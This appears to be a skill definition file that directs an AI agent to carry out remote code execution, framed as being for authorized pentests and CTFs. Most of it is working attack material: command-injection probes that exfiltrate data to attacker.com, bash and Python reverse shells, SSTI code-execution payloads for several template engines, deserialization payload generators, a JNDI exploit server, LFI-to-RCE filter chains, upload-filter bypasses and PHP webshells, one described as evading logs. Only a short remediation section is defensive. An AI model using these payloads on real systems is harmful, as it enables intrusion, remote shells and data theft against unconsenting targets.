---
name: rce-specialist
description: Remote code execution specialist for authorized pentests and CTF — covers OS command injection, SSTI fingerprinting and exploitation (Jinja2/Twig/FreeMarker/Velocity/Mako), Java/PHP/.NET deserialization gadget chains, LFI-to-RCE via PHP filter chains, file upload webshell, XXE-to-RCE, and prototype pollution RCE. Use when attempting or analyzing remote code execution on a target. Triggers on: RCE, remote code execution, command injection, SSTI, template injection, deserialization, ysoserial, phpggc, LFI to RCE, file upload shell, xxe rce, prototype pollution rce.
---

# Skill: rce-specialist

## Trigger

Fire when the task involves:
- Testing for or exploiting OS command injection
- Server-Side Template Injection (SSTI) fingerprinting and exploitation
- Java deserialization gadget chain selection and payload generation
- PHP deserialization (phpggc) payload generation
- .NET deserialization (ysoserial.net) payload generation
- LFI → RCE via PHP filter chains
- File upload → webshell
- XXE → RCE (via file write, SSRF to internal services)
- Prototype pollution leading to code execution

## Instructions

### Phase 1 — OS Command Injection

**Shell metacharacters (Unix/Linux)**
```
;    → cmd1 ; cmd2         (sequential)
|    → cmd1 | cmd2         (pipe, cmd2 always runs)
&&   → cmd1 && cmd2        (cmd2 runs if cmd1 succeeds)
||   → cmd1 || cmd2        (cmd2 runs if cmd1 fails)
`    → `cmd`               (command substitution)
$()  → $(cmd)              (POSIX substitution, preferred)
\n   → newline separator (URL: %0a)
```

**Windows cmd.exe**
```
&    → cmd1 & cmd2
|    → pipe
&&   → conditional AND
||   → conditional OR
```

**Detection probes (time-based, out-of-band)**
```bash
# Time-based (Linux)
127.0.0.1; sleep 5
127.0.0.1 | sleep 5
$(sleep 5)
`sleep 5`

# DNS OOB (interactsh/Burp Collaborator)
$(nslookup $(whoami).attacker.com)
`curl http://attacker.com/$(id|base64)`
; wget http://attacker.com/?x=$(id)
```

**Blind to interactive shell**
```bash
# Bash reverse shell
bash -i >& /dev/tcp/attacker.com/4444 0>&1
# URL-encoded:
bash%20-i%20>%26%20/dev/tcp/attacker.com/4444%200>%261

# Python reverse shell
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("attacker.com",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

### Phase 2 — SSTI Fingerprinting Decision Tree

```
Inject: {{7*7}}
  → Response contains 49?     → Jinja2 / Twig
      Inject: {{7*'7'}}
        → '7777777' → Jinja2 (Python)
        → 49        → Twig (PHP)
  → No change / literal {{7*7}}? → Not Jinja2/Twig
      Inject: #{7*7}
        → 49? → Velocity / FreeMarker (Java)
      Inject: ${7*7}
        → 49? → FreeMarker / Smarty / Pebble
      Inject: <%= 7*7 %>
        → 49? → ERB (Ruby) / EJS (Node)
```

**Exploitation per engine**

*Jinja2 (Python)*
```python
# RCE payload (no config, MRO chain)
{{''.__class__.mro()[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()}}
# Shorter via lipsum or config globals:
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
# cycler/joiner/namespace (Jinja2 2.x WAF bypass):
{{cycler.__init__.__globals__.os.popen('id').read()}}
```

*Twig (PHP)*
```php
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{['id']|map('system')|join}}
```

*FreeMarker (Java)*
```
<#assign ex = "freemarker.template.utility.Execute"?new()>${ex("id")}
```

*Velocity (Java)*
```
#set($e="e")
$e.getClass().forName("java.lang.Runtime").getMethod("exec","".getClass()).invoke($e.getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id")
```

**Auto-exploitation tool: tplmap**
```bash
git clone https://github.com/epinna/tplmap
pip3 install -r requirements.txt
# Detect + exploit:
python3 tplmap.py -u "http://target.com/page?name=*" --os-shell
# Or with POST:
python3 tplmap.py -u "http://target.com/page" -d "name=*" --os-shell
# With request file:
python3 tplmap.py -r request.txt --os-shell
```

### Phase 3 — Java Deserialization

```bash
# ysoserial (17k+ stars, canonical) — generates payload JAR
java -jar ysoserial.jar CommonsCollections1 'curl http://attacker.com/$(id|base64)' > payload.ser
java -jar ysoserial.jar CommonsCollections6 'id' | base64

# Gadget chains to try in order:
# 1. CommonsCollections1-7 (Apache Commons)
# 2. Spring1/Spring2 (Spring Framework)
# 3. URLDNS (blind probe — no RCE, just DNS ping)
#    java -jar ysoserial.jar URLDNS 'http://attacker.com' > probe.ser

# wh1t3p1g/ysomap (extends ysoserial, pluggable architecture)
git clone https://github.com/wh1t3p1g/ysomap
cd ysomap && mvn package -DskipTests
# Interactive: java -jar ysomap-0.1.1.jar
```

**nicowillis/marshalsec — JNDI redirect server (Log4Shell-style)**
```bash
git clone https://github.com/nicowillis/marshalsec
mvn package -DskipTests
# Start JNDI exploit server (redirects to attacker-controlled class)
java -cp target/marshalsec-*.jar marshalsec.jndi.LDAPRefServer "http://attacker.com/#Exploit"
# Payload injection point: ${jndi:ldap://attacker.com:1389/a}
```

### Phase 4 — PHP Deserialization (phpggc)

```bash
# ambionics/phpggc (PHP ysoserial equivalent)
git clone https://github.com/ambionics/phpggc
# List available chains:
./phpggc --list
# Generate Laravel RCE payload:
./phpggc Laravel/RCE9 system 'id' --base64
# Generate Symfony payload:
./phpggc Symfony/RCE4 exec 'id'
# Generate Guzzle chain:
./phpggc Guzzle/RCE1 exec 'id' -b
```

### Phase 5 — .NET Deserialization (ysoserial.net)

```powershell
# pwntester/ysoserial.net (v1.36, 23 gadgets)
# Download release JAR from GitHub releases
.\ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c "cmd /c whoami"
.\ysoserial.exe -f Json.Net -g ObjectDataProvider -c "cmd /c whoami"
.\ysoserial.exe -f ViewState -g TypeConfuseDelegate -c "cmd /c whoami" -v
# LosFormatter / SoapFormatter / LosFormatter variants also supported
```

### Phase 6 — LFI to RCE via PHP Filter Chain

```bash
# synacktiv/php_filter_chain_generator (no other tool does this as cleanly)
git clone https://github.com/synacktiv/php_filter_chain_generator
python3 php_filter_chain_generator.py --chain '<?php system($_GET["cmd"]); ?>'
# Output: php://filter/convert.iconv.UTF8.CSISO2022KR|...|/resource=data://,
# Use the generated chain as LFI include value:
# GET /index.php?page=php://filter/convert.iconv...
```

### Phase 7 — File Upload Webshell

```
Upload bypass checklist:
1. Extension: .php → .php5, .phtml, .phar, .shtml, .php%00.jpg
2. MIME type: change Content-Type to image/jpeg
3. Magic bytes: prepend GIF89a; before <?php
4. Double extension: shell.php.jpg (check Apache config)
5. Case: shell.PHP, shell.PhP
6. Null byte: shell.php%00.jpg (PHP < 5.3.4)

PHP webshell payloads:
<?php system($_GET['cmd']); ?>
<?php passthru($_GET['cmd']); ?>
<?php echo shell_exec($_GET['cmd']); ?>
<?php @eval($_POST['x']); ?>   // POST-based, harder to find in logs
```

### Phase 8 — Remediation

- OS command injection: never pass user input to shell; use subprocess with argument arrays (no shell=True); use library functions instead of system calls
- SSTI: use sandboxed template environments; never render user-controlled template strings; use Jinja2 SandboxedEnvironment
- Deserialization: avoid Java/PHP native deserialization with user input; use JSON/Protocol Buffers; sign serialized data; use deserialization filters (Java JEP 290)
- File upload: validate file type server-side (magic bytes + extension allowlist); store uploads outside webroot; disable script execution in upload directory

## References

- frohoff/ysoserial — https://github.com/frohoff/ysoserial (17,000+ stars, Apache-2.0)
- ambionics/phpggc — https://github.com/ambionics/phpggc (MIT)
- pwntester/ysoserial.net — https://github.com/pwntester/ysoserial.net
- synacktiv/php_filter_chain_generator — https://github.com/synacktiv/php_filter_chain_generator
- epinna/tplmap — https://github.com/epinna/tplmap (MIT)
- wh1t3p1g/ysomap — https://github.com/wh1t3p1g/ysomap
- nicowillis/marshalsec — https://github.com/nicowillis/marshalsec
- swisskyrepo/PayloadsAllTheThings — https://github.com/swisskyrepo/PayloadsAllTheThings
- Source report: rce-reaper-deep-research-2026-10-27.md